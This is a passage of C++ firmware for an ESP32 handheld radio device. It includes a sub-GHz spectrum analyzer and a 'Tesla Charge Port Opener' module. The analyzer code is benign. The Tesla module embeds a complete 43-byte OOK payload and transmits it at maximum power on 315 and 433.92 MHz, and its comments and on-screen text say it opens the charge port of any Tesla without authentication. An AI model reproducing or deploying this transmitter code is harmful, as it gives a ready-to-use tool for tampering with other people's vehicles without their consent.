    // Hot pink separator between bars and line graph
    tft.drawFastHLine(0, SEP_Y, SCREEN_WIDTH, HALEHOUND_HOTPINK);

    // Line graph axes
    tft.drawFastHLine(WF_X, AXIS_Y, WF_WIDTH, HALEHOUND_MAGENTA);            // X axis
    tft.drawFastVLine(WF_X - 1, LG_Y, LG_HEIGHT + 1, HALEHOUND_MAGENTA);    // Y axis

    // Frequency labels below line graph X axis
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(WF_X, LABEL_Y);
    tft.print("300");
    tft.setCursor(WF_X + WF_WIDTH / 2 - 10, LABEL_Y);
    tft.print("434");
    tft.setCursor(WF_X + WF_WIDTH - 20, LABEL_Y);
    tft.print("925");

    // Key frequency markers under spectrum bars (gunmetal, subtle)
    tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
    // Bar 0 = 300MHz, Bar 16 = 433MHz, Bar 23 = 868MHz, Bar 30 = 915MHz
    tft.setCursor(WF_X, SEP_Y - 9);
    tft.print("300");
    tft.setCursor(WF_X + 16 * BAR_STRIDE, SEP_Y - 9);
    tft.print("433");
    tft.setCursor(WF_X + 23 * BAR_STRIDE - 2, SEP_Y - 9);
    tft.print("868");
    tft.setCursor(WF_X + 30 * BAR_STRIDE - 2, SEP_Y - 9);
    tft.print("915");
}

// ═══════════════════════════════════════════════════════════════════════════
// BATCH SCAN — All 33 frequencies in one pass (~20ms total, ~50 FPS)
// ═══════════════════════════════════════════════════════════════════════════

static void scanAllFrequencies() {
    for (int ch = 0; ch < frequencyCount && scanning && !exitRequested; ch++) {
        ELECHOUSE_cc1101.setMHZ(frequencyListMHz[ch]);
        cc1101PaSetRx();
        delayMicroseconds(250);  // 250us settle — CC1101 PLL locks in ~75us, extra margin for RSSI

        // Double RSSI read — OOK remotes pulse on/off, one read often catches "off"
        int rssi1 = ELECHOUSE_cc1101.getRssi();
        delayMicroseconds(50);
        int rssi2 = ELECHOUSE_cc1101.getRssi();
        int rssi = max(rssi1, rssi2);  // Take the stronger reading

        uint8_t level = rssiToLevel(rssi);
        rssiLevels[ch] = level;

        // Asymmetric smoothing — fast attack (75% new), slower decay (50% old)
        // Bars snap up instantly on signal, fade down smoothly
        if (level > peakLevels[ch]) {
            peakLevels[ch] = (peakLevels[ch] + 3 * level) / 4;  // Fast rise
        } else {
            peakLevels[ch] = (peakLevels[ch] + level) / 2;      // Smooth fall
        }
    }

}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 SCAN TASK — Continuous CC1101 scanning, stores RSSI in shared arrays
// ═══════════════════════════════════════════════════════════════════════════

static void saScanTask(void* param) {
    #if CYD_DEBUG
    Serial.println("[ANALYZER] Core 0: Scan task started");
    #endif

    while (saScanTaskRunning) {
        // Wait for Core 1 to consume previous frame
        if (saFrameReady) {
            vTaskDelay(1);
            continue;
        }

        // Only scan when not paused
        if (scanning) {
            scanAllFrequencies();
            saFrameReady = true;  // Signal Core 1 to draw
        } else {
            vTaskDelay(pdMS_TO_TICKS(20));  // Idle when paused
        }
    }

    #if CYD_DEBUG
    Serial.println("[ANALYZER] Core 0: Scan task exiting");
    #endif
    saScanTaskHandle = NULL;
    saScanTaskDone = true;
    vTaskDelete(NULL);
}

static void startScanTask() {
    if (saScanTaskHandle) return;
    saScanTaskRunning = true;
    saScanTaskDone = false;
    saFrameReady = false;
    xTaskCreatePinnedToCore(saScanTask, "SubAnalyze", 4096, NULL, 1, &saScanTaskHandle, 0);
}

static void stopScanTask() {
    saScanTaskRunning = false;
    if (saScanTaskHandle) {
        // Wait for task to self-delete (sets saScanTaskDone before vTaskDelete(NULL))
        unsigned long t0 = millis();
        while (!saScanTaskDone && (millis() - t0 < 500)) {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        saScanTaskHandle = NULL;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// STATUS AREA — Peak frequency + scan state
// ═══════════════════════════════════════════════════════════════════════════

static void drawStatusArea() {
    tft.fillRect(0, STATUS_Y, SCREEN_WIDTH, 36, TFT_BLACK);

    // Find peak frequency
    int peakIdx = 0;
    uint8_t peakVal = 0;
    for (int i = 0; i < frequencyCount; i++) {
        if (rssiLevels[i] > peakVal) {
            peakVal = rssiLevels[i];
            peakIdx = i;
        }
    }

    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(5, STATUS_Y + 2);
    tft.printf("Peak: %.1f MHz  Lv:%d", frequencyListMHz[peakIdx], peakVal);

    tft.setCursor(5, STATUS_Y + 14);
    tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
    int activeCount = 0;
    for (int i = 0; i < frequencyCount; i++) {
        if (displayLevel(peakLevels[i]) > 0) activeCount++;
    }
    tft.printf("Active:%d/%d  %s", activeCount, frequencyCount,
        scanning ? "SCANNING" : "PAUSED");
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[ANALYZER] SubGHz SDR Display initializing...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawAnalyzerUI();

    // Deselect other SPI devices
    pinMode(NRF24_CSN, OUTPUT);
    digitalWrite(NRF24_CSN, HIGH);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    // Reset SPI bus for CC1101
    SPI.end();
    delay(5);

    // Safe check — ELECHOUSE has blocking MISO loops that freeze with no CC1101
    if (!cc1101SafeCheck()) {
        #if CYD_DEBUG
        Serial.println("[ANALYZER] CC1101 not detected (safe check)");
        #endif
        return;
    }

    // Configure CC1101
    ELECHOUSE_cc1101.setSpiPin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);
    ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);

    if (ELECHOUSE_cc1101.getCC1101()) {
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setRxBW(812.5);  // Wide bandwidth for scanning
        cc1101PaSetRx();

        #if CYD_DEBUG
        Serial.println("[ANALYZER] CC1101 ready");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[ANALYZER] CC1101 not found!");
        #endif
        tft.setTextColor(TFT_RED);
        tft.setCursor(10, 100);
        tft.print("ERROR: CC1101 not found!");
        tft.setCursor(10, 115);
        tft.print("Check SPI wiring!");
        delay(2000);
    }

    // Initialize data arrays
    memset(rssiLevels, 0, sizeof(rssiLevels));
    memset(peakLevels, 0, sizeof(peakLevels));
    memset(peakHoldSeg, 0, sizeof(peakHoldSeg));
    memset(peakHoldTime, 0, sizeof(peakHoldTime));
    memset(prevBarSegs, 0, sizeof(prevBarSegs));
    memset(prevLineY, 0, sizeof(prevLineY));
    prevLineValid = false;
    lastStatusDraw = 0;

    // Build heat map palette + display boost LUT
    initHeatPalette();
    initDisplayLUT();

    // Reset state
    scanning = true;
    exitRequested = false;

    // Draw static UI elements
    drawStaticElements();

    initialized = true;

    // Start Core 0 scanning task
    startScanTask();

    #if CYD_DEBUG
    Serial.println("[ANALYZER] SDR display ready - 17 frequencies, dual-core");
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// LOOP
// ═══════════════════════════════════════════════════════════════════════════

void loop() {
    if (!initialized) return;

    // Update touch
    touchButtonsUpdate();

    // Icon bar touch handling
    static unsigned long lastIconTap = 0;
    if (millis() - lastIconTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
                for (int i = 0; i < SA_ICON_NUM; i++) {
                    if (tx >= saIconX[i] && tx < saIconX[i] + SA_ICON_SIZE) {
                        lastIconTap = millis();
                        switch (i) {
                            case 0:  // Start/Stop scanning
                                if (scanning) stopScan();
                                else startScan();
                                break;
                            case 1:  // Clear / reset display
                                memset(peakLevels, 0, sizeof(peakLevels));
                                memset(rssiLevels, 0, sizeof(rssiLevels));
                                memset(peakHoldSeg, 0, sizeof(peakHoldSeg));
                                memset(peakHoldTime, 0, sizeof(peakHoldTime));
                                memset(prevBarSegs, 0, sizeof(prevBarSegs));
                                prevLineValid = false;
                                tft.fillRect(WF_X, WF_Y, WF_WIDTH, WF_HEIGHT, TFT_BLACK);
                                tft.fillRect(0, LG_Y, SCREEN_WIDTH, LG_HEIGHT, TFT_BLACK);
                                drawStaticElements();
                                break;
                            case 2:  // Reserved
                                break;
                            case 3:  // Back / exit
                                exitRequested = true;
                                return;
                        }
                        break;
                    }
                }
            }
        }
    }

    // Hardware button handling
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        exitRequested = true;
        return;
    }

    if (buttonPressed(BTN_SELECT)) {
        if (scanning) stopScan();
        else startScan();
        delay(200);
    }

    if (buttonPressed(BTN_DOWN)) {
        memset(peakLevels, 0, sizeof(peakLevels));
        memset(rssiLevels, 0, sizeof(rssiLevels));
        memset(peakHoldSeg, 0, sizeof(peakHoldSeg));
        memset(peakHoldTime, 0, sizeof(peakHoldTime));
        memset(prevBarSegs, 0, sizeof(prevBarSegs));
        prevLineValid = false;
        tft.fillRect(WF_X, WF_Y, WF_WIDTH, WF_HEIGHT, TFT_BLACK);
        tft.fillRect(0, LG_Y, SCREEN_WIDTH, LG_HEIGHT, TFT_BLACK);
        drawStaticElements();
        delay(200);
    }

    // Draw when Core 0 has a new scan frame ready
    if (saFrameReady && scanning) {
        drawSpectrumBars();      // ~3ms — incremental LED VU meter bars
        drawLineGraph();         // ~7ms — erase old + draw new waveform
        saFrameReady = false;    // Signal Core 0 to scan next frame
    }

    // Status area refresh every 200ms
    if (millis() - lastStatusDraw >= 200) {
        drawStatusArea();
        lastStatusDraw = millis();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SCAN CONTROL
// ═══════════════════════════════════════════════════════════════════════════

void startScan() {
    scanning = true;
    cc1101PaSetRx();

    #if CYD_DEBUG
    Serial.println("[ANALYZER] Scanning started");
    #endif
}

void stopScan() {
    scanning = false;
    cc1101PaSetIdle();

    #if CYD_DEBUG
    Serial.println("[ANALYZER] Scanning stopped");
    #endif
}

bool isScanning() {
    return scanning;
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    stopScanTask();
    scanning = false;
    cc1101PaSetIdle();
    spiDeselect();

    initialized = false;
    exitRequested = false;

    #if CYD_DEBUG
    Serial.println("[ANALYZER] Cleanup complete");
    #endif
}

}  // namespace SubAnalyzer


// ═══════════════════════════════════════════════════════════════════════════
// TESLA CHARGE PORT OPENER
// Known static OOK signal — opens charge port on ALL Tesla models
// Zero authentication, zero rolling code — same signal for every Tesla
// Bit-bangs 43-byte payload via GDO0 at 2.5 kBaud (400μs/symbol)
// Source: TeslaTaunter (github.com/keldnorman/TeslaTaunter)
// ═══════════════════════════════════════════════════════════════════════════

namespace TeslaCharge {

// Tesla charge port OOK payload — universal, same for ALL Tesla models
// Preamble(4) + Sync(1) + Manchester-encoded command(38) = 43 bytes
static const uint8_t teslaPayload[] PROGMEM = {
    0x02, 0xAA, 0xAA, 0xAA,  // Preamble
    0x2B,                      // Sync
    0x2C, 0xCB, 0x33, 0x33, 0x2D, 0x34, 0xB5, 0x2B, 0x4D, 0x32,
    0xAD, 0x2C, 0x56, 0x59, 0x96, 0x66, 0x66, 0x5A, 0x69, 0x6A,
    0x56, 0x9A, 0x65, 0x5A, 0x58, 0xAC, 0xB3, 0x2C, 0xCC, 0xCC,
    0xB4, 0xD2, 0xD4, 0xAD, 0x34, 0xCA, 0xB4, 0xA0
};
#define TESLA_PAYLOAD_LEN 43

// Region modes
enum Region { REGION_US = 0, REGION_EU, REGION_BOTH, REGION_COUNT };
static const char* regionNames[] = { "US  315 MHz", "EU  433.92 MHz", "BOTH (US + EU)" };

static bool initialized = false;
static bool exitRequested = false;
static int currentRegion = REGION_BOTH;
static bool sending = false;

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR — 3 icons: Back | Send | Region
// ═══════════════════════════════════════════════════════════════════════════

#define TC_ICON_NUM 3
static int tcIconX[TC_ICON_NUM] = {10, SCALE_X(110), SCALE_X(210)};
static const unsigned char* tcIcons[TC_ICON_NUM] = {
    bitmap_icon_go_back,       // 0: Back
    bitmap_icon_flash,         // 1: SEND
    bitmap_icon_sort_up_plus   // 2: Region cycle
};

static void drawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < TC_ICON_NUM; i++) {
        uint16_t color = HALEHOUND_MAGENTA;
        if (i == 1 && sending) color = HALEHOUND_HOTPINK;
        tft.drawBitmap(tcIconX[i], ICON_BAR_Y, tcIcons[i], 16, 16, color);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY
// ═══════════════════════════════════════════════════════════════════════════

static void drawMainUI() {
    tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, SCREEN_HEIGHT - CONTENT_Y_START, TFT_BLACK);

    // Skull watermark
    tft.drawBitmap(SCALE_X(180), SCALE_Y(40), bitmap_icon_skull_subghz, 16, 16, tft.color565(0, 30, 40));

    // Nosifer glitch title
    drawGlitchText(SCALE_Y(55), "TESLA", &Nosifer_Regular10pt7b);

    // Subtitle
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    const char* sub = "CHARGE PORT OPENER";
    int sw = strlen(sub) * 6;
    tft.setCursor((SCREEN_WIDTH - sw) / 2, SCALE_Y(65));
    tft.print(sub);

    // Separator
    tft.drawLine(0, SCALE_Y(70), SCREEN_WIDTH, SCALE_Y(70), HALEHOUND_HOTPINK);

    // Region frame
    int frameX = 15;
    int frameY = SCALE_Y(78);
    int frameW = SCREEN_WIDTH - 30;
    int frameH = SCALE_H(22);
    tft.drawRoundRect(frameX, frameY, frameW, frameH, 4, HALEHOUND_VIOLET);
    tft.drawRoundRect(frameX + 1, frameY + 1, frameW - 2, frameH - 2, 3, HALEHOUND_GUNMETAL);

    // Region text
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    int rw = strlen(regionNames[currentRegion]) * 6;
    tft.setCursor((SCREEN_WIDTH - rw) / 2, frameY + 7);
    tft.print(regionNames[currentRegion]);

    // Big send button
    int btnY = SCALE_Y(115);
    int btnH = SCALE_H(40);
    tft.drawRoundRect(20, btnY, SCREEN_WIDTH - 40, btnH, 8, HALEHOUND_HOTPINK);
    tft.drawRoundRect(21, btnY + 1, SCREEN_WIDTH - 42, btnH - 2, 7, HALEHOUND_MAGENTA);

    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setFreeFont(&FreeMonoBold12pt7b);
    const char* btnText = "OPEN PORT";
    int bw = tft.textWidth(btnText);
    tft.setCursor((SCREEN_WIDTH - bw) / 2, btnY + btnH / 2 + 6);
    tft.print(btnText);
    tft.setFreeFont(NULL);

    // Status
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
    const char* idle = "- IDLE -";
    int iw = strlen(idle) * 6;
    tft.setCursor((SCREEN_WIDTH - iw) / 2, SCALE_Y(170));
    tft.print(idle);

    // Help text
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(SCALE_X(15), SCALE_Y(195));
    tft.print("Tap region frame to cycle");
    tft.setCursor(SCALE_X(15), SCALE_Y(210));
    tft.print("US=315  EU=433.92  BOTH");
    tft.setCursor(SCALE_X(15), SCALE_Y(225));
    tft.print("Works on ALL Tesla models");
    tft.setCursor(SCALE_X(15), SCALE_Y(240));
    tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.print("5 reps x 400us/bit OOK");
}

static void updateRegionDisplay() {
    int frameX = 15;
    int frameY = SCALE_Y(78);
    int frameW = SCREEN_WIDTH - 30;
    int frameH = SCALE_H(22);
    tft.fillRect(frameX + 3, frameY + 3, frameW - 6, frameH - 6, TFT_BLACK);
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    tft.setTextSize(1);
    int rw = strlen(regionNames[currentRegion]) * 6;
    tft.setCursor((SCREEN_WIDTH - rw) / 2, frameY + 7);
    tft.print(regionNames[currentRegion]);
}

static void showStatus(const char* text, uint16_t color) {
    tft.fillRect(0, SCALE_Y(165), SCREEN_WIDTH, SCALE_H(20), TFT_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(color, TFT_BLACK);
    int sw2 = strlen(text) * 6;
    tft.setCursor((SCREEN_WIDTH - sw2) / 2, SCALE_Y(170));
    tft.print(text);
}

// ═══════════════════════════════════════════════════════════════════════════
// TRANSMISSION — Bit-bang OOK payload via GDO0 at 2.5 kBaud
// ═══════════════════════════════════════════════════════════════════════════

static void sendPayloadAtFreq(float freqMhz) {
    ELECHOUSE_cc1101.setMHZ(freqMhz);
    ELECHOUSE_cc1101.setModulation(2);  // OOK/ASK
    ELECHOUSE_cc1101.setPA(12);         // Max power
    cc1101PaSetTx();
    delay(5);  // Let PA settle

    pinMode(CC1101_GDO0, OUTPUT);

    // Read payload from PROGMEM into RAM for fast access
    uint8_t buf[TESLA_PAYLOAD_LEN];
    memcpy_P(buf, teslaPayload, TESLA_PAYLOAD_LEN);

    // 5 repetitions with 23ms inter-frame gap (matches original Tesla key fob timing)
    for (int rep = 0; rep < 5; rep++) {
        // Bit-bang MSB-first, 400μs per symbol (2.5 kBaud)
        for (int i = 0; i < TESLA_PAYLOAD_LEN; i++) {
            uint8_t byte = buf[i];
            for (int bit = 7; bit >= 0; bit--) {
                digitalWrite(CC1101_GDO0, (byte >> bit) & 1);
                delayMicroseconds(400);
            }
        }
        digitalWrite(CC1101_GDO0, LOW);
        delay(23);
    }

    #if CYD_DEBUG
    Serial.printf("[TESLA] TX complete @ %.2f MHz (5 reps)\n", freqMhz);
    #endif
}

static void sendTesla() {
    sending = true;
    drawIconBar();

    if (currentRegion == REGION_US || currentRegion == REGION_BOTH) {
        showStatus(">> TX 315 MHz (US) <<", HALEHOUND_HOTPINK);
        sendPayloadAtFreq(315.0);
    }

    if (currentRegion == REGION_EU || currentRegion == REGION_BOTH) {
        showStatus(">> TX 433.92 MHz (EU) <<", HALEHOUND_HOTPINK);
        sendPayloadAtFreq(433.92);
    }

    cc1101PaSetIdle();

    // Flash success
    showStatus(">> PORT OPENED <<", HALEHOUND_GREEN);
    sending = false;
    drawIconBar();
    delay(1000);

    showStatus("- IDLE -", HALEHOUND_GUNMETAL);
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP / LOOP / CLEANUP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[TESLA] Initializing Tesla Charge Port...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawIconBar();

    // Deselect other SPI devices
    pinMode(NRF24_CSN, OUTPUT);
    digitalWrite(NRF24_CSN, HIGH);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);
    SPI.end();
    delay(5);

    // CC1101 safe check
    if (!cc1101SafeCheck()) {
        #if CYD_DEBUG
        Serial.println("[TESLA] CC1101 not detected");
        #endif
        tft.setTextColor(TFT_RED);
        tft.setCursor(10, 100);
        tft.print("ERROR: CC1101 not found!");
        delay(2000);
        exitRequested = true;
        return;
    }

    ELECHOUSE_cc1101.setSpiPin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);
    ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);

    if (ELECHOUSE_cc1101.getCC1101()) {
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setModulation(2);  // OOK
        ELECHOUSE_cc1101.setPA(12);
        #if CYD_DEBUG
        Serial.println("[TESLA] CC1101 initialized at max power");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[TESLA] CC1101 not found!");
        #endif
        tft.setTextColor(TFT_RED);
        tft.setCursor(10, 100);
        tft.print("ERROR: CC1101 not found!");
        delay(2000);
        exitRequested = true;
        return;
    }

    exitRequested = false;
    currentRegion = REGION_BOTH;
    sending = false;

    drawMainUI();

    initialized = true;
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    // Icon bar touches
    static unsigned long lastTap = 0;
    if (millis() - lastTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
                // Back
                if (tx >= (tcIconX[0] - 5) && tx <= (tcIconX[0] + 25)) {
                    lastTap = millis();
                    exitRequested = true;
                    return;
                }
                // Send
                if (tx >= (tcIconX[1] - 15) && tx <= (tcIconX[1] + 25) && !sending) {
                    lastTap = millis();
                    sendTesla();
                    waitForTouchRelease();
                    return;
                }
                // Region cycle
                if (tx >= (tcIconX[2] - 15) && tx <= (tcIconX[2] + 25) && !sending) {
                    lastTap = millis();
                    currentRegion = (currentRegion + 1) % REGION_COUNT;
                    updateRegionDisplay();
                    waitForTouchRelease();
                    return;
                }
            }

            // Big button tap — send
            int btnY = SCALE_Y(115);
            int btnH = SCALE_H(40);
            if (ty >= (unsigned)btnY && ty <= (unsigned)(btnY + btnH) && tx >= 20 && tx <= (unsigned)(SCREEN_WIDTH - 20) && !sending) {
                lastTap = millis();
                sendTesla();
                waitForTouchRelease();
                return;
            }

            // Region frame tap — cycle
            int frameY = SCALE_Y(78);
            int frameH = SCALE_H(22);
            if (ty >= (unsigned)frameY && ty <= (unsigned)(frameY + frameH) && !sending) {
                lastTap = millis();
                currentRegion = (currentRegion + 1) % REGION_COUNT;
                updateRegionDisplay();
                waitForTouchRelease();
                return;
            }
        }
    }

    // Hardware buttons
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        exitRequested = true;
        return;
    }
    if (buttonPressed(BTN_SELECT) && !sending) {
        sendTesla();
    }
    if ((buttonPressed(BTN_UP) || buttonPressed(BTN_DOWN)) && !sending) {
        currentRegion = (currentRegion + 1) % REGION_COUNT;
        updateRegionDisplay();
    }
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    cc1101PaSetIdle();
    spiDeselect();
    initialized = false;
    exitRequested = false;

    #if CYD_DEBUG
    Serial.println("[TESLA] Cleanup complete");
    #endif
}

}  // namespace TeslaCharge


// ═══════════════════════════════════════════════════════════════════════════
// SUBGHZ UTILITIES
// ═══════════════════════════════════════════════════════════════════════════

void cc1101Init() {
    // Deselect other SPI devices
    pinMode(NRF24_CSN, OUTPUT);
    digitalWrite(NRF24_CSN, HIGH);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    // Reset SPI bus so ELECHOUSE can configure fresh
    SPI.end();
    delay(5);

    // Safe check — ELECHOUSE has blocking MISO loops that freeze with no CC1101
    if (!cc1101SafeCheck()) {
        #if CYD_DEBUG
        Serial.println("[CC1101] Not detected (safe check)");
        #endif
        return;
    }

    // Configure CC1101 SPI and GDO pins
    ELECHOUSE_cc1101.setSpiPin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);
    ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);

    if (ELECHOUSE_cc1101.getCC1101()) {
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setMHZ(433.92);
        cc1101PaSetRx();
        #if CYD_DEBUG
        Serial.println("[CC1101] Init complete - SPI18/19/23 CS27 GDO0=22 GDO2=35");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[CC1101] ERROR: Not detected!");
        #endif
    }
}

void cc1101Cleanup() {
    cc1101PaSetIdle();
    spiDeselect();
}
